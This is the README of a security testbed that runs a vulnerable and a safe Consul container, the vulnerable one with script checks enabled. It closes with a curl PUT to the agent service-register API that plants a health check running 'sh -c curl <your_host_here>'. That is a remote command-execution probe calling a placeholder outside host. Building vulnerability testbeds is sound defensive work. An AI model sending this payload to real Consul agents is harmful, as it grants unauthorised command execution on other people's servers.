# Consul Exposed UI (Exposed API)
This testbed contains vulnerable and safe containers for Consul. The vulnerable version has `-enable-script-checks` and the safe version lacks it.


## Docker Compose
```
docker compose up
```
The vulnerable service will be on port 8081 and the safe service will be on port 8082.

## Confirming the vulnerability

```
curl -H 'Content-Type: application/json' -X PUT \
    -d '{
        "Name": "test",
        "check": {
            "Args": ["sh", "-c", "curl <your_host_here>"],
            "interval": "10s",
            "timeout": "600s"
        }
    }' localhost:8081/v1/agent/service/register
```